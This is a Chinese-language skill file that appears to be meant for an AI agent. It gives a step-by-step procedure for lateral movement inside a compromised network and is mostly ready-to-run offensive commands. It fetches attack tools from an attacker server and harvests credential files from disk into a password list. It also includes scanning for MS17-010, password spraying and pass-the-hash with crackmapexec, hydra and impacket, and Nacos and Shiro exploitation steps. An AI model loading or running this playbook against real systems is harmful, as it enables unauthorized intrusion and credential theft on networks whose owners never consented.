---
name: c2-lateral-movement
description: C2驱动的内网横向移动标准作业流程。从端口探测→进程定位→searchall64全盘配置采集→pass.txt密码本提取→fs.exe资产扫描→密码喷洒→横向移动的完整攻击链。覆盖Shiro反序列化、Nacos配置收割、SOCKS5隧道避坑技巧。触发词：横向移动、内网渗透、密码喷洒、fs扫描、searchall64、Nacos利用、Shiro反序列化。
metadata:
  short-description: C2驱动内网横向移动作业流程
  tools: searchall64,fs.exe,netstat,tasklist,crackmapexec,hydra,impacket
  phases: 6
  categories: lateral-movement,c2,post-exploitation,pivoting,password-spray
version: "1.0"
author: CyberStrikeAI
---

# C2 驱动内网横向移动标准作业流程

## 两条路线

```bash
1. 工具传 agent → ipconfig 解网段 → fs.exe -np 扫C段（隐蔽）
2. 本机建 SOCKS5 隧道 → proxychains 透过去扫（可控）
```

**核心逻辑:** 进内网第一步永远是看端口→找进程→搜配置→取密码→扫网段→喷密码

---

## Phase 0: 前置准备

```bash
# 上传工具到 agent
curl -o %TEMP%\fs.exe http://YOUR_SERVER/fs.exe
curl -o %TEMP%\searchall64.exe http://YOUR_SERVER/searchall64.exe
```

## Phase 1: 端口 → 进程 → 文件定位

**核心: 看本机开了什么、跑着什么、文件在哪**

```bash
# 微信所有监听端口 + PID
netstat -ano | findstr LISTENING

# 看进程路径（定位文件位置）
tasklist /V
wmic process get processid,executablepath,name

# 结果解读:
# TCP 0.0.0.0:3306 → MySQL    TCP 0.0.0.0:80 → phpStudy/Apache
# TCP 0.0.0.0:808 → Tomcat   TCP 0.0.0.0:3389 → RDP
```

## Phase 2: searchall64 全盘敏感信息采集

```bash
searchall64.exe search -p C:\
# 自动搜: database.php, .env, my.ini, web.config, application.yml
# 精准定向（根据 Phase 1 发现的端口）:

# MySQL (3306)
type C:\phpstudy_pro\Extensions\MySQL*\my.ini 2>nul

# Web (80/8080)
dir /s /b C:\phpstudy_pro\WWW\*config* 2>nul

# Java 应用
dir /s /b C:\*.properties C:\application*.yml 2>nul
```

## Phase 3: 提取密码 → pass.txt

从 searchall64 结果中自动提取密码:

```python
import re, json, sys

PASSWORD_PATTERNS = [
    r'(?i)(password|passwd|pwd|db_password)\s*[=:]\s*["\']?([^"\'\\s;]+)',
    r'(?i)(secret|api_key|token)\s*[=:]\s*["\']?([^"\'\\s;]+)',
    r'jdbc:mysql://[^"\'\\s]+',
]

passwords = set()
for pat in PASSWORD_PATTERNS:
    for m in re.finditer(pat, sys.stdin.read()):
        p = m.group(2) if m.lastindex >= 2 else m.group(0).strip()
        if 4 < len(p) < 100: passwords.add(p)

# 追加常见弱口令
for w in ['admin','admin123','Admin@123','root','root@123','123456','P@ssw0rd','test','test123']:
    passwords.add(w)

with open('pass.txt', 'w') as f: f.write('\n'.join(sorted(passwords)))
print(f'[+] pass.txt 已生成: {len(passwords)} 个密码')
```

## Phase 4: fs.exe -np 内网资产扫描

```bash
# 1. 先看有哪些网段
ipconfig

# 2. 扫描（-np = 无ping，最隐蔽）
fs.exe -h 192.168.191.0/24 -np

# 3. MS17-010 专项
fs.exe -h 192.168.191.0/24 -np -m ms17010
```

## Phase 5: 密码喷洒 + 横向移动

```bash
# SMB 喷洒
proxychains crackmapexec smb 192.168.191.0/24 -u users.txt -p pass.txt

# RDP 爆破
proxychains crowbar -b rdp -s 192.168.191.0/24 -u administrator -C pass.txt

# SSH 爆破
proxychains hydra -L users.txt -P pass.txt ssh://192.168.191.128

# MySQL 爆破
proxychains hydra -l root -P pass.txt mysql://192.168.191.128

# 获取凭证后横向
proxychains impacket-smbexec "admin:pass@192.168.191.128"
proxychains impacket-wmiexec "admin:pass@192.168.191.128"
proxychains impacket-dcomexec "admin:pass@192.168.191.128"
# Pass-The-Hash
proxychains impacket-smbexec -hashes :NTLMHASH "admin@192.168.191.128"
```

## Phase 6: Nacos / Shiro / Web 漏洞利用

### Nacos 利用链 (CVE-2021-29441)

```bash
# Step 1: 认证绕过
curl -H 'User-Agent: Nacos-Server' 'http://target:8848/nacos/v1/auth/users?pageNo=1&pageSize=10'

# Step 2: 默认密码登录
curl -X POST 'http://target:8848/nacos/v1/auth/login' -d 'username=nacos&password=nacos'

# Step 3: 读配置 → 收割全内网凭据
curl 'http://target:8848/nacos/v1/cs/configs?accessToken=TOKEN&search=blur'

# Step 4: 写配置 (Spring YAML RCE 前置)
curl -X POST 'http://target:8848/nacos/v1/cs/configs' -d 'accessToken=TOKEN&dataId=test&group=DEFAULT_GROUP&content=...'
```

### Shiro 反序列化

```bash
# 确认 Shiro
curl -s -b "rememberMe=test" "http://target/login" | grep -i "set-cookie"
# → rememberMe=deleteMe ✅

# 找 Shiro key → 反编译 jar
javap -c -p ShiroConfig.class | grep "String.*=="

# 生成 payload
java -jar ysoserial-all.jar CommonsBeanutils1 "ping YOUR_IP" > /tmp/payload.bin

# 用 Java 加密
java -cp . Enc "KEY_BASE64" /tmp/payload.bin

# 发送
curl -s -b "rememberMe=$ENCRYPTED_PAYLOAD" "http://target/login"
```

## 隧道架构核心避坑

```bash
# SOCKS5 出口是 Agent，不是 C2！
# ❌ 本机 → C2:1080 → SOCKS5 → 目标
# ✅ 本机 → C2:1080 → Agent(具体IP) → 目标

# Agent 能 ping 通 ≠ Agent 能 TCP 通（防火墙可能拦 TCP 不拦 ICMP）
# Agent IP 变了 → 隧道失效

# 本机有直连路径时 → 优先直接打
curl http://192.168.80.148:8848/nacos/  # 比绕隧道快100倍
```

## 完整自动化脚本

```bash
python3 lateral_full.py <CID>
# 一键: 端口→搜索→密码→扫描→喷洒
```

## 输出产物

```
results/
├── 1-ports.txt           # netstat + 进程
├── 2-searchall64.txt     # 全盘扫描
├── 3-configs/            # 配置文件
├── 4-pass.txt            # ★ 密码本（核心产物）
├── 5-scan_*.txt          # fs.exe 扫描结果
└── 6-summary.json        # 结构化摘要
```
